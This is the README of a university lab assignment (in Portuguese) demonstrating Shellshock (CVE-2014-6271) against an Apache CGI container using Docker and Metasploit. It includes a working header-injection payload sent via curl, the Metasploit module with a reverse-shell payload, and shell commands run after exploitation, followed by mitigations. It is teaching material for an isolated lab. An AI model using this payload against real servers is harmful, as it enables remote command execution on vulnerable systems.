# Trabalho 2 - Pentest com Metasploit

Laboratorio controlado para demonstrar a exploracao da vulnerabilidade
Shellshock (CVE-2014-6271) em um servidor Apache CGI vulneravel, usando Docker
e Metasploit.

## Integrantes

- Nome 1 - NUSP/RA:
- Nome 2 - NUSP/RA:
- Nome 3 - NUSP/RA:
- Nome 4 - NUSP/RA:

## Objetivo

O objetivo deste projeto e estudar, analisar e demonstrar um exploit executado
via Metasploit em ambiente virtualizado e controlado. O ataque escolhido explora
uma falha historica do GNU Bash que permite execucao remota de comandos quando
dados controlados pelo atacante sao importados como variaveis de ambiente.

## Vulnerabilidade

- CVE: CVE-2014-6271
- Nome comum: Shellshock
- Alvo: Apache CGI executando script interpretado por Bash vulneravel
- Impacto: execucao remota de comandos com os privilegios do processo web
- Modulo Metasploit: `exploit/multi/http/apache_mod_cgi_bash_env_exec`
- Payload: `generic/shell_reverse_tcp`

## Estrutura do projeto

```text
.
├── attacker/
│   └── Dockerfile
├── docs/
│   ├── relatorio.md
│   └── roteiro-video.md
├── metasploit/
│   └── shellshock.rc
├── victim/
│   ├── Dockerfile
│   └── cgi/
│       └── status.cgi
├── docker-compose.yml
└── README.md
```

## Ambiente

O laboratorio possui dois containers na rede interna `pentest_net`:

- `attacker`: container com Metasploit Framework, IP `172.28.0.10`
- `victim`: container com Apache CGI e Bash vulneravel, IP `172.28.0.20`

A rede Docker e marcada como interna para manter a demonstracao isolada.

## Requisitos

- Docker
- Docker Compose v2

No WSL, caso o Docker Desktop esteja em uso, o contexto esperado e o `default`:

```bash
docker context use default
docker ps
docker compose version
```

## Execucao

Subir o laboratorio:

```bash
docker compose up --build
```

Em outro terminal, validar se a vitima responde:

```bash
docker exec -it attacker curl http://172.28.0.20/cgi-bin/status.cgi
```

Saida esperada:

```text
Shellshock lab victim
CGI script executed as: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Validacao manual da vulnerabilidade

Enviar um cabecalho HTTP malicioso para criar um arquivo de prova na vitima:

```bash
docker exec -it attacker curl -H 'User-Agent: () { :;}; /bin/touch /tmp/shellshock-proof' http://172.28.0.20/cgi-bin/status.cgi
docker exec -it victim ls -l /tmp/shellshock-proof
```

A resposta HTTP pode ser `500 Internal Server Error`. A prova da exploracao e o
arquivo `/tmp/shellshock-proof` criado com dono `www-data`.

## Exploracao com Metasploit

Executar o roteiro do Metasploit:

```bash
docker exec -it attacker /usr/src/metasploit-framework/msfconsole -r /workspace/metasploit/shellshock.rc
```

O resultado esperado inclui:

```text
The target is vulnerable.
Command shell session 1 opened
```

Caso o Metasploit retorne ao prompt `msf6`, entrar na sessao aberta:

```text
sessions -i 1
```

Comandos para demonstracao dentro da shell obtida:

```bash
id
hostname
pwd
cat /etc/os-release
```

## Mitigacoes

- Atualizar o Bash para uma versao corrigida.
- Desabilitar CGI quando nao for necessario.
- Executar o servidor web com usuario de baixo privilegio.
- Filtrar cabecalhos suspeitos em WAF ou reverse proxy.
- Restringir conexoes de saida para dificultar shells reversas.
- Segmentar a rede e monitorar logs HTTP.
- Aplicar hardening com AppArmor, SELinux ou perfis seccomp.

## Documentacao

- Relatorio: `docs/relatorio.md`
- Roteiro da videoaula: `docs/roteiro-video.md`

